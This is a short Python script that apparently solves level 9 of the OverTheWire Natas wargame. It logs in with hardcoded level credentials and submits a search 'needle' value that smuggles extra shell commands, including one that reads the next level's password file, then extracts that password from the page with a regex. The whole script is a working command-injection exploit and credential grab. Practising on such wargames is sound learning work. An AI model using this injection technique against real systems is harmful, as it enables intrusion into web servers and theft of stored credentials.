import requests
import re

s = requests.session()
s.auth = ("natas9","W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl")

#req = s.get("http://natas9.natas.labs.overthewire.org")
data = requests.Request("POST","http://natas9.natas.labs.overthewire.org", data={"needle":"whoami; cat /etc/natas_webpass/natas10 ; ","Submit":"Search"})
game = s.send(s.prepare_request(data))
nextcode = re.findall('[a-zA-Z0-9]{32}',game.text)

print(nextcode[1])

